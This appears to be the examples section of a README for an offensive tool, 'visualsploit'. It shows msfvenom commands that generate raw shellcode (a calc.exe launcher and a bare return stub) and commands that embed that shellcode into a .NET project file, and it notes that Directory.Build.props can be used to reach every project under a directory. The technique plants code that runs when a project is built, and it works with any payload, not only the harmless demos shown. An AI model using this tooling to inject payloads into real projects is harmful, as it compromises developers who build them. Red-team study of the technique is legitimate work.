# Examples

Generate a Windows x64 sample that launches Calculator:

```bash
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f raw -o calc.bin
visualsploit Sample.csproj calc.bin -s 42 --platform windows
```

Generate a Linux smoke test payload that returns immediately:

```bash
printf '\303' > ret.bin
visualsploit Sample.csproj ret.bin -s 42 --platform linux
```

Use `Directory.Build.props` instead of `Sample.csproj` to target every project below a directory.
